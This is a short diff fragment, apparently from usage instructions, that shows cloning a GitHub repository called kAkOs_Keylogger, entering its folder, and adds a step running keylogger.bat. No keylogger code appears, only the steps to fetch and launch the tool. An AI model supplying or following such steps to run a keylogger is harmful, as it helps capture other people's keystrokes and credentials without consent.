@@ -14,4 +14,6 @@ C:\>git clone https://github.com/kakos1301/kAkOs_Keylogger.git
 
 C:\>cd kAkOs_Keylogger
 
+C:\>keylogger.bat
+
 
